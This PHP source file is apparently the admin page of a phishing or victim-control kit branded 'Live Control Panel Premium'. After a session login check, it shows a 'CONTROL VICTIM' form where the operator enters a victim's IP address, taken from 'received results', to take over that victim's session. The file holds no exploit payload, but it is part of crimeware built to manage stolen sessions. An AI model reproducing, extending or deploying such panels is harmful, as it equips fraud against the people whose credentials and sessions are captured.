<?php
session_start();
require "classes/admin.class.php";
if(!isset($_SESSION['user']) OR $_SESSION['user']==""){
	exit(header("location: login.php"));
}
?>
<!doctype html>
<html>

<head>
	<title>Settings</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
	<link rel="stylesheet" href="res/app.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" />
	<script src="res/jq.js"></script>
</head>

<body>
	<div class="header">
        <div class="left">
            <i class='fa fa-user'></i> Welcome, <b>
                <?php echo substr(PNL_USERNAME, 0, 8); ?>
            </b>
			
        </div>
		<div class="right">
			<button onclick="logout()"class="ban"><i class='fa fa-lock'></i> Log out</button>
		</div>
	</div>
	<div class="content">
		<div class="holder">

			<div class="multi">
				<div class="box">
					<div class="title">CONTROL VICTIM</div>
					<div class="content">
						<p>Please find the IP address in your received results.</p>
						<form action="view.php" method="get">
							<div class="input">
								<input type="text" name="vip" id="bot-token" required placeholder="Victim IP address">
							</div>
							<button type="submit">GO</button>
						</form>
					</div>
				</div>


				<form action="update.php" method="post">


					<?php
					if (isset($_GET['update']) and $_GET['update'] == 'success') {
						echo "<h3 style='color:green;'>Data updated successfully!</h3>";
					}
					?>



				</form>

			</div>


		</div>

	</div>

	<div class="footer">
		<div class="info">Live Control Panel Premium</div>
	</div>
</body>

</html>